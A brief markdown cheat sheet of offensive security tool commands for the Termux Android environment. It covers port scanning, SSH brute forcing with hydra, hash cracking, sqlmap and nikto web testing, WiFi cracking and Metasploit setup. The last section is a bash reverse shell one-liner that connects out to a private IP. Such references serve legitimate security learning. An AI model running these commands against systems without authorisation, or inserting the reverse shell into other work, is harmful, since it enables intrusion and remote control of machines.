# Termux Hacking Tools Commands

 Educational use only.

---

# Network Scanning

## nmap

Scan open ports.

Example

```bash
nmap -sV 192.168.1.1
```

---

## masscan

High speed port scanner.

```bash
masscan 192.168.1.0/24 -p1-65535
```

---

# Password Cracking

## hydra

Brute force login credentials.

Example

```bash
hydra -l admin -P passwords.txt ssh://192.168.1.5
```

---

## john

Password hash cracking.

```bash
john hashes.txt
```

---

## hashcat

GPU based hash cracking.

```bash
hashcat -m 0 hashes.txt wordlist.txt
```

---

# Web Security

## nikto

Web vulnerability scanner.

```bash
nikto -h http://target.com
```

---

## sqlmap

SQL injection testing.

```bash
sqlmap -u "http://site.com/page?id=1"
```

---

# Wireless

## aircrack-ng

WiFi security auditing.

```bash
aircrack-ng capture.cap
```

---

# Exploitation Framework

## metasploit

Install

```bash
pkg install metasploit
```

Run

```bash
msfconsole
```

---

# OSINT Tools

theHarvester  
amass  
subfinder  

---

# Packet Analysis

tcpdump  
wireshark  

---

# Reverse Shell Example

```
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
```

---

Always use tools **legally and ethically**.
